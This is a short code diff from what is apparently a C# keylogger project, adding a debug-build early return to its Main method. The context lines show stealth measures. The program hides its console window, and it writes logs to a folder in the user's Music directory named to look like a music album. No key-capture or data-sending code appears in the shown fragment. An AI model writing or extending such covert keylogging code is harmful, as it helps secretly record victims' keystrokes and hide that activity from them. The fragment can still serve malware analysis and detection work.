@@ -20,6 +20,9 @@ namespace KeyLogger
         static void Main(string[] args)
         {
             ShowWindow(GetConsoleWindow(), 0);
+           #if DEBUG
+              return;
+           #endif
             long wroteToLogCount = 0;
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) +
                 @"\Justin Bieber's Greatest Hits\";
